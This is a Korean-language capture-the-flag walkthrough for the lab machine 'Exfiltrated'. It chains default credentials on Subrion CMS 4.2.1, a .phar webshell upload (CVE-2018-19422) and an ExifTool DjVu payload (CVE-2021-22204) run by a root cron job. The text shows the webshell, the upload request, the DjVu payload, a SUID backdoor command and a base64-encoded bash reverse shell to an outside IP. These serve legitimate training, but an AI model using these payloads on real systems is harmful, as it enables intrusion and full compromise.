---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/file-upload
  - tech/lin/cron
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.163
domain: exfiltrated.offsec
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2018-19422, CVE-2021-22204]
status: solved
manual_tags: true
tech_count: 4
---
> [!info] 상단 요약
> **Exfiltrated** · PG Practice Pentester Foundations #9 · Fundamental · Ubuntu 20.04 (`exfiltrated`, 192.168.248.163)
> 80 에 Subrion CMS 4.2.1 → `robots.txt` 가 알려준 `/panel` 에 `admin:admin` 으로 로그인 → CVE-2018-19422 로 `.phar` 웹셸을 올려 `www-data` → root 크론이 매분 업로드 디렉터리를 ExifTool 11.88 로 훑는다 → CVE-2021-22204 DjVu 페이로드 → root.
> **확보 플래그 2개** (`local.txt`·`proof.txt`)

## 0. 이 박스에서 배우는 것

1. 확장자 블랙리스트는 "무엇을 막는가"가 아니라 **웹서버가 무엇을 PHP로 넘기는가**로 뚫린다. `.php` 만 막아도 `.phar` 가 남는다.
2. 업로드 응답의 메타데이터가 검사 로직을 자백한다. `mime: text/x-php` 를 찍어놓고 통과시켰다는 건 확장자만 본다는 뜻이다.
3. 라우터형 CMS 는 스캐너를 통째로 무력화한다. 와일드카드 301, 의미 없는 확장자, 200 응답에 404 본문 — 세 가지가 한꺼번에 나온다.
4. 상태 코드가 같아도 응답 크기가 계층을 알려준다. Apache 자체 403 은 283바이트, 앱이 렌더한 404 는 17.5KB 다.
5. 크론 권한상승에서 감시 경로와 파일명 필터는 추측하는 것이 아니라 스크립트를 읽어서 확정하는 것이다. 틀리면 에러 없이 무시된다.
6. 재시도 한 번에 60초가 드는 상황에서는 페이로드를 이중화한다. SUID 와 리버스셸을 같이 넣고, 리버스셸은 백그라운드로 던진다.
7. 공개 익스플로잇은 읽고 필요한 요청만 떼어낸다. EDB 49876 은 그대로 돌리면 실패한다.

**시험 출제 가능성** — 매우 높다. 기본 자격증명으로 관리 패널 진입, 업로드 필터 우회로 웹셸, root 크론이 훑는 디렉터리에 파일 놓기. 세 요소 전부 시험 단골이다. 변형을 예상해 두면 블랙리스트가 `.php`+`.phtml` 까지 막는 경우(→ `.phar`), 화이트리스트인 경우(→ 이중확장자·매직바이트 위조), 크론이 `find` 나 `tar *` 를 쓰는 경우(→ 와일드카드 인젝션), exiftool 대신 ImageMagick 인 경우(→ ImageTragick) 정도다. 자동 도구 없이 curl 만으로 전 과정이 되는 박스라 시험 연습용으로 값이 있다.

---

## 1. 정찰

### 1-1. Nmap

```bash
┌──(kali㉿kali)-[~/PG/Exfiltrated]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.163
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

플래그별로 무엇이 걸려 있는지:

| 플래그 | 역할 | 빼면 어떻게 되나 |
|---|---|---|
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | 서비스 이름만 나오고 버전이 안 나온다. `Apache 2.4.41 (Ubuntu)` 가 곧 OS 판정 근거다 |
| `-p-` | 전 65535 포트 | 기본 1000포트에 걸리는 박스지만, 습관을 깨면 다음 박스에서 당한다([[Hawat]]는 80이 아예 없다) |
| `-Pn` | 핑 스캔 생략 | ICMP를 막는 호스트를 "다운"으로 오판한다. 랩에서는 항상 붙인다 |
| `-A` | OS·traceroute까지 | `-sCV` 와 중복되지만 OS 추정을 추가로 준다 |
| `--min-rate 5000` | 최소 패킷 속도 | 없으면 `-p-` 가 수십 분 간다. 시험 24시간에서 이 한 줄이 시간을 산다 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 보고서 증빙 + 나중에 다시 grep |

**22와 80뿐이다.** SSH 는 8.2p1 로 Ubuntu 20.04 기본값이라 공격면이 아니고, 그러면 80 하나에 모든 것이 걸려 있다. 이 시점의 계획은 웹 앱을 식별하고 알려진 취약점이나 인증 우회를 찾는 것으로 좁혀진다.

### 1-2. 80이 `http://exfiltrated.offsec/`으로 302 리다이렉트한다

> [!warning] 가상호스트 이름을 `/etc/hosts` 에 먼저 등록해야 한다
> IP로 접근하면 가상호스트 이름으로 튕긴다. 등록하지 않으면 이후 모든 요청이 엉뚱하게 동작한다.
> ```bash
> echo '192.168.248.163 exfiltrated.offsec' | sudo tee -a /etc/hosts
> ```

Apache 의 `<VirtualHost>` 는 `Host:` 헤더로 사이트를 고른다. IP로 요청하면 기본 사이트나 리다이렉트 스텁이 응답하고, 앱의 라우팅·세션·CSRF 가 전부 다른 컨텍스트에서 돈다. **업로드 요청이 200을 받는데 파일은 안 생기는** 부류의 미궁이 여기서 시작된다.

판별은 `curl -sI http://<IP>/` 로 `Location:` 헤더를 보고 거기 적힌 호스트명을 그대로 hosts 에 박으면 된다.

### 1-3. `robots.txt`가 관리 경로를 통째로 알려준다

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

`robots.txt` 는 "여기 보지 마세요" 목록이 아니라 사실상 **"여기 있습니다" 목록**이다. 디렉터리 브루트포싱보다 먼저 확인한다. 여기서는 관리 패널 `/panel` 과 `/backup/`·`/tmp/` 가 공짜로 나왔다.

`/panel` 이라는 이름 자체가 제품 식별 단서이기도 하다. WordPress 는 `/wp-admin`, Joomla 는 `/administrator`, Subrion 은 `/panel` 이다. 한 장으로 제품 후보와 관리 URL 이 동시에 잡혔다.

### 1-4. 디렉터리 열거 — Subrion 라우터가 만드는 함정 셋

**함정 ① 와일드카드 301로 gobuster가 즉시 중단된다.** Subrion 의 `.htaccess` 가 존재하지 않는 경로를 전부 라우터로 넘긴다. gobuster 는 이걸 와일드카드로 감지하고 멈춘다.

```
the server returns a status code that matches the provided options for non existing urls => 301
```

우회는 두 갈래다. 트레일링 슬래시 모드 `-f` 를 쓰면 없는 경로에 앱이 404를 주고, 아니면 파일 모드에 `-b 404,301` 을 붙인다.

`-f` 가 통하는 이유는 Subrion 의 rewrite 규칙이 `/foo` → `/foo/` 정규화 301을 먼저 던지기 때문이다. 처음부터 슬래시를 붙여 보내면 그 정규화 단계를 건너뛰고 라우터의 최종 판정(200 또는 404)을 직접 받는다. **모든 응답이 301이면 정규화 리다이렉트를 밟고 있다**는 신호로 읽으면 된다.

**함정 ② 확장자가 아무 의미도 없다.**

```
/panel.php   200  6155
/panel.txt   200  6155
/panel.bak   200  6155
/panel.zip   200  6155
/panel.phar  200  6155
```

전부 같은 바이트 수다. 라우터가 확장자를 무시하고 라우트 이름만 매칭하기 때문이고, `.bak`/`.zip` 백업 파일이 실재하는 게 아니다.

이걸 "백업 파일 유출"로 오독하면 시간을 통째로 버린다. `-x php,txt,bak,zip` 같은 확장자 스윕은 정적 파일 서버를 전제한 기법이라, front-controller 형 CMS(Subrion·Laravel·Symfony·WordPress permalink)에서는 확장자가 URL 의 장식일 뿐이다. 히트 수만 폭증하고 정보량은 0이다. 판정 규칙은 하나로 정리된다 — **서로 다른 확장자가 바이트 단위로 동일한 응답을 주면 그것은 파일이 아니라 라우트다.**

**함정 ③ `200` 응답인데 본문은 404다.**

```bash
└─$ curl -s http://exfiltrated.offsec/package.json
{"error":true,"message":"Requested URL not found.","code":404,"result":true}
```

Subrion API 가 HTTP 200 에 404 JSON 을 실어 보낸다. 상태 코드만 보는 스캐너는 전부 히트로 잡으니 본문을 봐야 한다.

이 볼트에서 반복 누적 중인 "응답이 성공을 뜻하지 않는다" 패턴의 한 사례다([[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]). 상태 코드는 전송 계층의 결과이고 성공·실패는 애플리케이션 계층의 의미다. 둘을 같은 것으로 취급하는 순간 스캐너 출력 전체가 노이즈가 된다.

### 1-5. `.htaccess` 프로브 — 응답 크기로 디스크 실존을 판별한다

디스크 실존 여부는 `.htaccess` 를 프로브해서 가른다. Apache 는 실제 파일에 대해 iso-8859-1 403(283바이트)을 주고, 없는 경로는 앱 404(약 17.5KB)로 떨어진다.

```
/uploads/.htaccess          403  283      ← 디스크에 실존
/tmp/.htaccess              403  283      ← 실존
/includes/.htaccess         403  283      ← 실존
/backup/.htaccess           403  283      ← 실존
/uploads/shared/.htaccess   404  17510    ← 없음
```

283바이트는 Apache 자체 403 이니 **그 경로가 디스크에 실재**한다는 뜻이고, 17.5KB 는 앱이 렌더한 404 페이지라 요청이 라우터까지 갔다는 뜻이다. 상태 코드가 같아도 크기가 계층을 알려준다. 이 기법으로 `/uploads/` 가 실존하는 업로드 저장 경로임을 **업로드 전에** 확정했다.

원리는 Apache 의 처리 순서다. `.htaccess`·`.ht*` 는 배포 기본 설정에서 `Require all denied` 로 차단되는데, 이 차단이 mod_rewrite 가 라우터로 넘기기 전에 걸린다. 그래서 403이 나온다는 것은 그 디렉터리가 실제로 디스크에 존재하고 Apache 가 거기까지 걸어갔다는 뜻이다. 없는 디렉터리면 rewrite 가 발동해 앱의 404 페이지, 즉 무거운 HTML 로 떨어진다.

라우터가 모든 것을 삼키는 앱에서 실제 디렉터리를 찾고 싶으면 서버가 앱보다 먼저 처리하는 경로를 프로브하면 된다. `.htaccess`, `.git/HEAD`(별도 차단이 없다면), 디렉터리 인덱스(`/path/`)의 403 등이 후보다. 판별 기준은 상태 코드가 아니라 응답 크기와 헤더 세트다.

### 1-6. 비인증 표면 지도

| 분류 | 경로 |
|---|---|
| 사용자 열거 | `/members/` (25KB, 회원 목록 노출) |
| 인증 표면 | `/panel/`, `/login/`, `/registration/`, `/forgot/` |
| 정보 유출 | `/changelog.txt`(49KB), `/license.txt`, `/README.md`, `/sitemap.xml` |
| 기능 | `/cron/` — 인증 없이 웹에서 크론 트리거 가능, `/hybrid/`(HybridAuth 소셜로그인 번들) |
| 403 차단 | `/install/`, `/updates/`, `/icons/`, `/server-status`, `.htaccess` 계열 |

이 중 `/changelog.txt` 가 값이 나간다. 버전 판정의 독립 근거가 되고, 수정된 취약점 목록이 그대로 적혀 있어 무엇이 아직 안 고쳐졌는지를 역산할 수 있다. 인증 전에 확보되는 파일치고 정보량이 크다.

### 1-7. Subrion CMS 4.2.1 — 기본 자격증명과 버전 교차 확인

`/panel` 로그인 화면:

![[PG-Exfiltrated-panel_login.png]]

`admin` / `admin` 으로 로그인된다. 대시보드 좌측 하단에 `Subrion CMS v 4.2.1` 이 그대로 찍혀 있다:

![[PG-Exfiltrated-panel_dashboard.png]]

"Recent activity"에 `Subrion version 4.2.1 installed. Cheers!` 도 남아 있어 버전이 두 곳에서 교차 확인된다. 푸터 문자열 하나로 버전을 확정하면 커스터마이즈나 의도적 위장에 속는다([[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]] 에서 반복된 교훈이다). 인증 전이라면 `/changelog.txt` 최상단 항목이 세 번째 근거가 된다.

4.2.1 은 **Subrion 의 마지막 릴리스**다. "업데이트가 아직 안 나온" 것이 아니라 영구 미패치이고, 이것이 CVE-2018-19422 가 여전히 살아 있는 이유다.

---

## 2. 취약점 분석

취약점이 둘 있고 뿌리는 같다. 둘 다 필터가 위험을 잘못 정의했다.

CVE-2018-19422 는 업로드 필터가 확장자 블랙리스트로 위험을 정의했는데, 실행 여부를 결정하는 것은 Apache 의 handler 매핑이다. 정의가 틀렸으니 목록을 아무리 늘려도 새는 곳이 남는다. CVE-2021-22204 는 이미지 파서가 메타데이터를 데이터로만 취급할 것이라 전제했는데, ExifTool 은 그것을 Perl 코드로 평가한다. 데이터와 코드의 경계가 파서 안에서 무너진 경우다.

### 2-1. 배경 지식 ① — 파일 업로드 방어의 4개 층

업로드 취약점을 만나면 어느 층에서 막고 있는지를 먼저 특정한다. 층마다 우회법이 다르다.

| 층 | 검사 내용 | 우회 방향 |
|---|---|---|
| ① 클라이언트 | JS의 `accept`, 확장자 검사 | Burp/curl로 요청을 직접 보내면 통째로 무효 |
| ② 확장자 블랙리스트 | "`.php` 는 금지" | 목록에 없는 실행 확장자를 찾는다 ← **이 박스** |
| ③ 확장자 화이트리스트 | "`.jpg`·`.png` 만 허용" | 이중확장자(`a.php.jpg`), 널바이트(구 PHP), 대소문자(`.PHP`), 후행 문자(`.php.`·`.php%20`), `.htaccess` 업로드로 handler 추가 |
| ④ 콘텐츠 검사 | 매직바이트, `getimagesize()`, 재인코딩 | 매직바이트 위조(`GIF89a;<?php ...`), 재인코딩을 견디는 페이로드(EXIF·polyglot) |

블랙리스트가 구조적으로 지는 이유는 세어야 할 집합의 성격이 다르기 때문이다. 화이트리스트는 허용할 것만 세면 되고 그 집합은 유한하다. 블랙리스트는 위험한 것을 전부 세야 하는데, 그 집합은 서버 설정에 따라 변한다. 즉 블랙리스트의 정답은 애플리케이션 코드가 아니라 **웹서버 설정 파일**에 있다. 앱 개발자가 알 수 없는 것을 앱에서 막으려 한 것이 CVE-2018-19422 의 본질이다.

### 2-2. 배경 지식 ② — Apache는 무엇을 "PHP"로 넘기는가

**확장자와 실행의 연결은 앱이 아니라 웹서버가 만든다.** Apache 에서 그 연결을 만드는 지시어는 셋이다.

| 지시어 | 형태 | 성격 |
|---|---|---|
| `AddType` | `AddType application/x-httpd-php .php .php3 .phtml` | MIME 타입을 확장자에 매핑. 구형 설정에서 흔함 |
| `AddHandler` | `AddHandler php7-script .php .phar` | 확장자 → 핸들러. 여러 확장자를 한 줄에 나열하는 형태라 잊힌 항목이 남기 쉽다 |
| `SetHandler` + `FilesMatch` | 정규식 기반 | Debian/Ubuntu 계열의 현행 기본값 |

Ubuntu 20.04의 PHP 패키지가 설치하는 설정은 정규식 형태다:

```apache
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

이 정규식을 풀어 읽으면 **`.phar`·`.php`·`.phtml` 세 개가 전부 PHP 로 실행**된다. `ph` 다음에 `ar|p|tml` 이 오는 형태를 한 번에 잡으려고 묶어 쓴 것이고, `.phar` 가 여기 들어간 이유는 PHP 아카이브(Phar)를 웹에서 직접 실행할 수 있게 하기 위해서다. 그 결과로 `.php` 만 막는 블랙리스트가 통째로 무력화된다.

그러니 "Apache 는 `.phar` 도 PHP 로 실행한다"를 마법처럼 외울 일이 아니다. 근거는 위 `FilesMatch` 한 줄이고, 서버 설정이 다르면 후보도 달라진다. 위 정규식에서 `.php3`·`.php4`·`.php5`·`.php7`·`.pht` 는 매칭되지 않는다. 그것들이 통하는 곳은 `AddType application/x-httpd-php .php .php3 .phtml` 같은 구형 나열식 설정이 남아 있는 서버다. 실전 순서는 **후보를 전부 던져 보고 어느 것이 실행되는지 실측**하는 쪽이지, 추론으로 하나만 고르는 게 아니다.

`[가정]` 이 호스트의 `/etc/apache2/mods-enabled/php7.4.conf` 를 직접 `cat` 하지는 않았다. 위 정규식은 Ubuntu 20.04 PHP 패키지의 기본값이며, `.phar` 실행이 실측으로 확인된 것과 정합한다.

셸 없이도 어느 확장자가 실행되는지 볼 수 있다. `<?php echo 7*6; ?>` 를 각 확장자로 올려 보고, 응답이 `42` 면 실행, 원문 그대로면 정적 서빙이다.

### 2-3. 왜 취약한가 — CVE-2018-19422 (Subrion CMS ≤ 4.2.1 인증 후 RCE)

Subrion 의 파일 매니저는 elFinder 커넥터를 `/panel/uploads/` 에 노출한다. 업로드 검증이 확장자 블랙리스트 방식이라, `.php` 와 일부 변형을 거부하는 것으로 "PHP 실행 파일 차단"을 달성했다고 간주한다.

데이터 흐름은 이렇다:

```
관리자 세션 (admin:admin)
        │
        ▼
POST /panel/uploads/read.json   cmd=upload
        │
        ├─ CSRF 토큰(__st) 검사 ................ 통과 (정상 세션이므로)
        ├─ 확장자 검사: 블랙리스트 매칭 ......... .phar → 목록에 없음 → 통과   ★
        ├─ MIME 판정: text/x-php 로 기록 ....... 판정만 하고 차단에 쓰지 않음  ★
        ▼
/var/www/html/subrion/uploads/exfsh01.phar  (디스크에 저장)
        │
        ▼
GET /uploads/exfsh01.phar        ← Apache FilesMatch가 PHP 핸들러로 전달
        ▼
system($_GET['cmd']) 실행 → www-data
```

★ 표시한 두 지점이 결함이다. **`.phar` 가 목록에 없다**는 것, 그리고 MIME 을 알아냈으면서도 차단 판단에 쓰지 않는다는 것.

CVE-2018-19422 는 관리자 권한을 요구하는 인증 후 취약점이다. 그런데 이 박스처럼 **기본 자격증명이 살아 있으면 인증은 장애물이 아니다.** 시험에서 "인증이 필요한 익스플로잇이라 못 쓴다"고 접기 전에 기본 자격증명·약한 비밀번호·자가 가입·인증 우회를 먼저 확인하는 게 낫다.

### 2-4. `mime: text/x-php`가 결정적 증거인 이유

업로드 응답이 저장 URL과 판정 MIME 을 그대로 알려준다.

```json
{"added":[{"mime":"text\/x-php","size":"30","name":"exfsh01.phar",
 "url":"http:\/\/exfiltrated.offsec\/uploads\/exfsh01.phar"}]}
```

`mime` 이 `text/x-php` 로 잡혔는데도 업로드가 통과한다 — **확장자만 보고 MIME 은 안 본다**는 증거다.

이 한 줄에서 세 가지가 읽힌다. 서버가 파일 내용을 실제로 들여다봤다(`text/x-php` 는 확장자로는 나올 수 없는 판정이다. `.phar` 의 MIME 이 아니다). 그런데도 차단하지 않았으니 콘텐츠 기반 검사가 차단 경로에 연결돼 있지 않다. 그리고 저장 URL 을 알려주니 파일이 웹루트 아래 실행 가능한 위치에 놓인다.

응답이 `mime: application/octet-stream` 이었다면 판단이 달라진다. 서버가 내용을 안 봤거나 무해화했을 수 있으니 `7*6` 실행 프로브로 확인해야 한다. **업로드 API 의 JSON 응답은 전문을 읽는 편이 좋다.** 저장 경로·정규화된 파일명·판정 MIME 이 다음 수를 결정한다.

### 2-5. 왜 이 페이로드인가 — `.phar` 웹셸 조각 해설

```
POST /panel/uploads/read.json
  reqid=17978446266285, cmd=upload, target=l1_Lw, __st=<CSRF 토큰>
  upload[]  filename="exfsh01.phar"  →  <?php system($_GET["cmd"]); ?>
```

| 조각 | 역할 | 빼거나 바꾸면 |
|---|---|---|
| `cmd=upload` | elFinder 커넥터의 명령 디스패치 | 다른 값이면 파일 목록·삭제 등 다른 동작 |
| `target=l1_Lw` | 업로드 대상 디렉터리 ID. base64 인코딩된 볼륨+경로(`l1` 볼륨의 `Lw` = `/`) | 값이 틀리면 대상 없음 오류. 목록 요청 응답에서 그대로 복사하면 된다 |
| `__st=<CSRF 토큰>` | 세션당 CSRF 토큰 | 빠지면 요청 거부. 로그인 후 패널 HTML 에서 뽑아야 한다 |
| `filename="exfsh01.phar"` | 블랙리스트에 없고 Apache 가 PHP 로 실행하는 확장자 | `.php` 면 거부, `.jpg` 면 통과하지만 실행되지 않는다 |
| `<?php system($_GET["cmd"]); ?>` | 최소 웹셸. GET 파라미터를 셸에 넘긴다 | — |

웹셸을 30바이트로 유지한 건 응답의 `"size":"30"` 이 그대로 무결성 확인이 되기 때문이다. 짧을수록 인용 중첩이나 인코딩 사고가 줄고, 업로드 필터에 콘텐츠 검사가 있더라도 걸릴 표면이 작다. `system()` 대신 `passthru()`·`shell_exec()`·`exec()` 도 되지만 `system()` 은 출력을 곧바로 표준출력으로 흘려서 curl 로 받기 가장 편하다. `disable_functions` 로 막혀 있다면 `system` → `passthru` → `shell_exec` → `exec` → `popen` → `proc_open` → `pcntl_exec` 순으로 순회한다.

### 2-6. 배경 지식 ③ — CVE-2021-22204 (ExifTool DjVu 주석 RCE)

두 번째 취약점은 성격이 다르다. 파서가 데이터를 코드로 평가하는 부류다.

DjVu 파일 포맷에는 `ANTa`/`ANTz` 라는 주석(annotation) 청크가 있고, `ANTz` 는 bzz 로 압축된 주석이다. ExifTool 은 이 주석을 파싱할 때 내부적으로 Perl 의 `eval` 을 거치는 경로가 있었다. 주석 값에 `\c` 이스케이프와 함께 Perl 코드를 심으면, 문자열로 취급될 것이라 전제된 데이터가 그대로 실행된다. **exiftool 로 파일을 읽기만 해도 코드가 돈다**는 뜻이고, 쓰기나 변환은 필요 없다.

| 항목 | 값 |
|---|---|
| 영향 버전 | 7.44 ~ 12.23 (이 박스: **11.88**) |
| 수정 버전 | 12.24 |
| 트리거 조건 | 취약 exiftool 이 악성 DjVu 데이터를 파싱하기만 하면 됨 |
| 실행 주체 | exiftool 을 실행한 사용자 ← 여기서는 root 크론 |

실전에서 이 CVE 의 값은 읽기만 해도 실행된다는 데 있다. 대부분의 파일 기반 RCE 는 공격자가 실행 시점을 통제한다 — 웹셸 URL 을 자기가 호출하는 식이다. 이건 반대로 피해자가 파일을 처리하는 순간 실행되므로, **누가 언제 이 파일을 읽는가가 곧 권한상승 경로**가 된다. 이미지 처리 파이프라인, 썸네일 생성, 메타데이터 수집 크론, 백업 스크립트가 전부 후보다. 셸을 잡으면 `exiftool -ver` 과 `convert -version`(ImageMagick)·`identify` 를 반사적으로 확인하는 습관이 여기서 값을 한다.

[[Exghost]] 도 같은 CVE 였지만 트리거가 달랐다.

| | [[Exghost]] | Exfiltrated (여기) |
|---|---|---|
| 실행 지점 | 웹 업로드가 즉시 exiftool 호출 | root 크론이 매분 디렉터리를 훑음 |
| 필요한 선행 조건 | 없음 (비인증 업로드) | 먼저 `www-data` 셸을 잡아야 감시 디렉터리에 쓸 수 있음 |
| 얻는 권한 | 웹서버 사용자 | root |
| 지연 | 즉시 | 최대 60초 |
| 실패 시 비용 | 재업로드 즉시 | 60초 + 원인 불명(조용히 무시됨) |

Exghost 는 던지고 확인하면 됐지만 여기는 **던지기 전에 조건을 전부 확정**해야 한다. 4장의 규율이 전부 이 차이에서 나온다.

### 2-7. 왜 이 DjVu 페이로드인가 — 조각 해설

```bash
┌──(kali㉿kali)-[~/PG/Exfiltrated/exif]
└─$ cat configfile
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },
    },
);
1; #end

┌──(kali㉿kali)-[~/PG/Exfiltrated/exif]
└─$ cat payload
(metadata "\c${system('echo Y2htb2QgK3MgL2Jpbi9iYXNoOyAoYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy81NTU1IDA+JjEnICYp | base64 -d | bash')};")
```

| 조각 | 역할 |
|---|---|
| `configfile` | ExifTool 에 사용자 정의 태그를 등록한다. 기본 태그 목록에는 임의 바이너리를 그대로 실을 자리가 없어서, `0xc51b`(HasselbladExif)를 `Writable => 'string'` 으로 선언해 DjVu 파일 전체를 EXIF 필드 값으로 밀어 넣을 통로를 만든다 |
| `0xc51b` | 실제 존재하는 Hasselblad 전용 태그 번호. 흔치 않아 다른 파서와 충돌이 적다 |
| `1; #end` | Perl 모듈 파일이 참을 반환해야 로드가 성공한다. 이 줄이 없으면 config 로드 실패 |
| `(metadata "...")` | DjVu 주석 청크의 문법. ExifTool 이 이 안을 파싱한다 |
| `\c${...}` | `\c` 이스케이프 뒤의 `${ }` 가 Perl 문자열 보간으로 해석되어 **블록 안이 코드로 평가**된다 |
| `system('...')` | 평가될 Perl 코드. 셸 명령을 실행한다 |
| `echo <base64> \| base64 -d \| bash` | 인용 중첩 회피. 실제 명령에 `'`·`"`·`>`·`&`·`$` 가 섞여 있는데, 이것이 Perl 문자열 → DjVu 주석 → bzz 압축 → EXIF 값 → 셸로 5중 중첩된다. base64 는 영숫자와 `+/=` 뿐이라 어느 층에서도 깨지지 않는다 |

base64를 디코드하면:

```bash
chmod +s /bin/bash; (bash -c 'bash -i >& /dev/tcp/192.168.45.207/5555 0>&1' &)
```

[[Hawat]] 의 hex 리터럴(`0x3c3f706870...`), [[Squid]] 의 `INTO DUMPFILE`, 여기의 base64 는 전부 같은 계열의 회피 기법이다. **페이로드가 3층 이상을 통과해야 하면 인용 escape 를 손으로 맞추려 하지 마라.** 대신 영숫자만으로 이루어진 표현(base64/hex)으로 바꾼 뒤 최종 층에서 한 번만 디코드한다. 따옴표를 몇 개 겹쳐야 하는지 세고 있다면 이미 잘못된 길이다.

### 2-8. 페이로드 이중화 — 왜 두 개를 동시에 넣는가

```bash
chmod +s /bin/bash          # ① SUID 백도어 — 영구적, 확인 쉬움
( ... 리버스셸 ... &)        # ② 즉시 대화형 셸 — 편리함
```

| | `chmod +s /bin/bash` | 리버스셸 |
|---|---|---|
| 성공 확인 | `ls -l /bin/bash` 한 줄로 즉시 판정 | 리스너가 붙어야만 앎 |
| 실패 원인 | 거의 없음(root면 무조건 성공) | 아웃바운드 차단·방화벽·포트 점유 |
| 지속성 | 남는다 (재크론 불필요) | 끊기면 60초 재대기 |
| 편의성 | `bash -p` 로 매번 승격 | 즉시 대화형 |

리버스셸을 `( ... &)` 로 감싼 것은 취향이 아니다. 크론이 실행한 `exiftool` 프로세스가 리버스셸에 물려서 반환하지 않으면 **그 크론 인스턴스가 끝나지 않는다.** 크론이 매분 새 인스턴스를 띄우며 프로세스가 쌓이고, 스크립트의 나머지 파일 처리가 실행되지 않고, 리스너를 닫는 순간 딸린 프로세스 전체가 죽는다. `( cmd & )` 는 서브셸에서 백그라운드로 던지고 즉시 반환하므로 부모(exiftool → 크론)는 정상 종료하고 셸은 고아 프로세스로 살아남는다. 크론이나 서비스 훅, 이미지 처리 파이프라인에 페이로드를 심을 때는 부모를 막지 않는지 확인한다.

### 2-9. 두 취약점을 잇는 고리 — 왜 `www-data` 셸이 반드시 먼저인가

체인 전체를 신뢰 경계로 다시 그리면 이렇게 된다:

```
[비인증 인터넷]
      │  기본 자격증명 admin:admin          ← 경계 1: 인증
      ▼
[Subrion 관리자]
      │  CVE-2018-19422 (.phar 업로드)      ← 경계 2: 앱 → OS 코드 실행
      ▼
[www-data]  ── uploads/ 에 쓰기 가능
      │  root 크론이 그 디렉터리를 파싱      ← 경계 3: 저권한 데이터 → 고권한 파서
      ▼  CVE-2021-22204 (ExifTool DjVu)
[root]
```

경계 3이 이 박스의 설계 결함이다. `www-data` 가 쓸 수 있는 디렉터리를 root 가 읽으니, 데이터가 낮은 권한에서 높은 권한으로 검증 없이 흐른다. 이 구조만 있으면 exiftool 이 아니어도 된다. `tar *` 와일드카드 인젝션, ImageMagick 의 ImageTragick, `find -exec`, 파일명 인젝션이 전부 같은 자리에서 터진다. 권한상승 정찰에서 던질 질문은 무엇이 취약한가가 아니라 **내가 쓸 수 있는 것을 누가 읽는가** 쪽이다.

그래서 순서를 바꿀 수 없다. CVE-2021-22204 를 먼저 알고 있어도 감시 디렉터리에 파일을 놓을 수단, 즉 `www-data` 셸이 없으면 무의미하다. 반대로 [[Exghost]] 는 웹 업로드가 곧 exiftool 호출이라 경계 2와 3이 하나로 합쳐져 비인증 상태에서 즉시 터진다.

---

## 3. Foothold — CVE-2018-19422 업로드 필터 우회

Subrion 의 파일 매니저(elFinder 커넥터)는 블랙리스트 방식으로 `.php` 만 막는다. 그런데 Apache 는 `.phar` 도 PHP 로 실행한다.

```
POST /panel/uploads/read.json
  reqid=17978446266285, cmd=upload, target=l1_Lw, __st=<CSRF 토큰>
  upload[]  filename="exfsh01.phar"  →  <?php system($_GET["cmd"]); ?>
```

응답이 저장 URL 을 그대로 알려준다.

```json
{"added":[{"mime":"text\/x-php","size":"30","name":"exfsh01.phar",
 "url":"http:\/\/exfiltrated.offsec\/uploads\/exfsh01.phar"}]}
```

2-4 에서 본 그대로다. **`mime` 이 `text/x-php` 인데도 통과한다.**

![[PG-Exfiltrated-webshell.png]]

```bash
┌──(kali㉿kali)-[~/PG/Exfiltrated]
└─$ curl -s 'http://exfiltrated.offsec/uploads/exfsh01.phar?cmd=id;uname -a'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux exfiltrated 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64
```

첫 명령을 `id;uname -a` 로 묶은 건 웹셸이 요청마다 새 프로세스라 상태가 없기 때문이다. 한 번에 최대한 많이 확인하는 편이 이득이다. `id` 로 권한을, `uname -a` 로 커널과 아키텍처를 본다. 5.4.0-74 는 2021년 커널이라 dirtypipe(5.8+)는 대상 밖이고, 커널 경로를 후순위로 미룬다는 판단이 여기서 나왔다.

공개 익스플로잇 EDB 49876 은 그대로 쓰면 안 된다. 두 가지 이유로 비대화식 환경에서 실패한다. 세션 쿠키 `INTELLI_06c8042c3d=15ajqmku31n5e893djc8k8g7a0` 가 하드코딩돼 있고, 마지막이 `input()` 대화 루프라 SSH 비대화식 실행에서 멈춘다. 소스를 읽고 업로드 요청만 떼어내 직접 구현했다(`sub_upload.py`). 익스플로잇이 안 돌면 스크립트를 읽는다 — [[Levram]]·[[Exghost]] 에서 반복된 교훈이다.

하드코딩된 쿠키가 세션을 죽이는 경로는 이렇다. `requests.Session()` 은 로그인 응답의 `Set-Cookie` 를 쿠키 자에 담아 이후 요청에 자동으로 싣는다. 그런데 코드가 `cookies={'INTELLI_...': '<고정값>'}` 를 요청 단위로 명시하면 같은 이름의 쿠키가 세션 쿠키를 덮어써서 죽은 세션 ID 가 전송된다. 결과는 **로그인은 성공했는데 업로드만 401/403** 인 상태다. 네트워크 캡처 없이는 원인이 안 보이는 형태의 실패다.

